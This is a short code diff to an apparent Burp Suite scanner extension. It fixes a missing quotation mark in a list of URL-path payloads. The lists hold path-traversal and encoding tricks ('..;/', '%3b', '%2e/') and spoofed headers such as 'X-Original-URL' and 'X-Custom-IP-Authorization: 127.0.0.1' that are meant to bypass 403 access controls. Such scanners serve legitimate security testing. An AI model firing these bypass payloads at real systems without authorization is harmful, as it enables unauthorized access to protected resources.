@@ -55,7 +55,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         self.stdout.println("Scanning: "+Rurl)
 
 
-        payloads = ["a.ico/../"+LastPath,a.css/../"+LastPath,"a.png/../"+LastPath,"aaa/../"+LastPath,"%3b"+LastPath,"%3b/"+LastPath,"//"+LastPath,"%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/", "img/..;/"+LastPath,"js/..;/"+LastPath,";/"+LastPath,LastPath+"/",LastPath+".json",LastPath+"#",LastPath+"%20",LastPath+";", LastPath+"..;", LastPath+".", LastPath+"%20/","scripts/..;/"+LastPath,"static/..;/"+LastPath]
+        payloads = ["a.ico/../"+LastPath,"a.css/../"+LastPath,"a.png/../"+LastPath,"aaa/../"+LastPath,"%3b"+LastPath,"%3b/"+LastPath,"//"+LastPath,"%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/", "img/..;/"+LastPath,"js/..;/"+LastPath,";/"+LastPath,LastPath+"/",LastPath+".json",LastPath+"#",LastPath+"%20",LastPath+";", LastPath+"..;", LastPath+".", LastPath+"%20/","scripts/..;/"+LastPath,"static/..;/"+LastPath]
         payloads1 = ["/a.ico/.."+Rurl,"/a.css/.."+Rurl,"/a.png/.."+Rurl,"/aaa/.."+Rurl,"/."+Rurl,Rurl+"/%3b/",Rurl+"/~","/%2e"+Rurl,  "/."+Rurl+"/./",  "/img/..;"+Rurl,"/;"+Rurl,"/js/..;"+Rurl,"/scripts/..;"+Rurl,"/static/..;"+Rurl,"/;"+Rurl,"/%20"+Rurl,]
         hpayloads = ["X-Rewrite-URL: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1", "X-Original-URL: /"+LastPath]
         results = []
